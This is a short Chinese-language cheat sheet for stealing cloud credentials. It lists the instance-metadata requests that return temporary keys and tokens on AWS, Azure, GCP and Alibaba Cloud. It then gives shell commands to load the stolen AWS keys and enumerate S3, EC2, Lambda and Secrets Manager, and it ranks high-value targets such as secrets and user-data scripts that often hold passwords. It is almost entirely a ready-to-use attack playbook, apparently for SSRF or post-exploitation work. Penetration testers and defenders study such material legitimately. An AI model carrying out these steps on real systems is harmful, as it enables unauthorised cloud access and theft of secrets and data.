# 云凭据提取与利用

## AWS IAM Role 凭据
```
# 列出挂载的 IAM Role
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 获取临时凭据（返回 AccessKeyId + SecretAccessKey + Token）
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

返回示例：
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "xxx",
  "Token": "xxx",
  "Expiration": "2024-01-01T00:00:00Z"
}
```

## Azure Managed Identity Token
```
GET http://169.254.169.254/metadata/identity/oauth2/token
    ?api-version=2018-02-01
    &resource=https://management.azure.com/
    Header: Metadata: true
```

## GCP Service Account Token
```
GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
    Header: Metadata-Flavor: Google
```

## 阿里云 STS Token
```
GET http://100.100.100.200/latest/meta-data/ram/security-credentials/<role-name>
```

---

## AWS 快速利用

```bash
# 配置凭据
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=xxx
export AWS_SESSION_TOKEN=xxx

# 确认身份
aws sts get-caller-identity

# 枚举 S3
aws s3 ls

# 枚举 EC2
aws ec2 describe-instances --region us-east-1

# 枚举 Lambda
aws lambda list-functions --region us-east-1

# 枚举 Secrets Manager
aws secretsmanager list-secrets --region us-east-1
```

## 高价值目标
- **S3 存储桶**：可能包含备份、日志、敏感数据
- **Secrets Manager / Parameter Store**：数据库密码、API 密钥
- **Lambda 代码**：可能包含硬编码凭据
- **EC2 User-Data**：启动脚本可能包含密码

## 其他元数据信息

除了凭据，元数据还包含有价值的信息：
```
# 实例信息
/latest/meta-data/instance-id
/latest/meta-data/instance-type
/latest/meta-data/ami-id
/latest/meta-data/hostname
/latest/meta-data/local-ipv4
/latest/meta-data/public-ipv4

# 网络信息（VPC、子网）
/latest/meta-data/network/interfaces/macs/<mac>/vpc-id
/latest/meta-data/network/interfaces/macs/<mac>/subnet-id

# User-Data（启动脚本——经常包含密码！）
/latest/user-data
```
